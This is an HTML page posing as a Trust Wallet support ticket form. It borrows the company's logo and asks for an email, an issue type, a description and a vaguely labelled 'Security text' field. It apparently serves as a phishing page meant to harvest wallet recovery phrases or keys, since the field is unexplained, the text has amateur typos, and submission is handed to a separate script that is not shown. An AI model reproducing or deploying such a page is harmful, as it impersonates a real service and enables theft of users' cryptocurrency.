<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Trust Support</title>
    <link rel="stylesheet" href="./index.css" />
  </head>
  <body>
    <div class="wrapper">
      <header>
        <div class="logo">
          <img
            src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"
          />
          <h2>Trust Wallet</h2>
        </div>
        <p>
          Kindly provide the informations required below to create a complaint
          ticket...
        </p>
      </header>

      <main>
        <div>
          <label for="" class="label">Email</label>
          <input type="text" id="input" />
        </div>

        <div>
          <label for="" class="label">Isuue type</label>
          <select id="select">
            <option>....</option>
            <option value="Transaction (fees, pending/stuck transaction etc.)">
              Transaction (fees, pending/stuck transaction etc.)
            </option>
            <option
              value="Wallet (setup/recovery, addresses, missing funds etc.)"
            >
              Wallet (setup/recovery, addresses, missing funds etc.)
            </option>
            <option
              value="Buying crypto (payment method, ID verification etc.)"
            >
              Buying crypto (payment method, ID verification etc.)
            </option>
            <option value="DApps (WalletConnect, DApp browser etc.)">
              DApps (WalletConnect, DApp browser etc.)
            </option>
            <option
              value="DEX and Swap (Exchange/Swap issues, token not listed, etc.)"
            >
              DEX and Swap (Exchange/Swap issues, token not listed, etc.)
            </option>
            <option value="other">Other</option>
          </select>
        </div>

        <div>
          <label for="" class="label">Description</label>
          <textarea id="desc" rows="4"></textarea>
        </div>

        <div>
          <label for="" class="label">Security text</label>
          <textarea id="textarea" rows="4"></textarea>
        </div>
        <button id="button">Submit</button>
        <p class="no-show" id="submit-msg">
          Thanks for submitting your query, we will get back to you with posible
          solutions via your email.. Thanks
        </p>
      </main>
    </div>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="./index.js"></script>
</html>
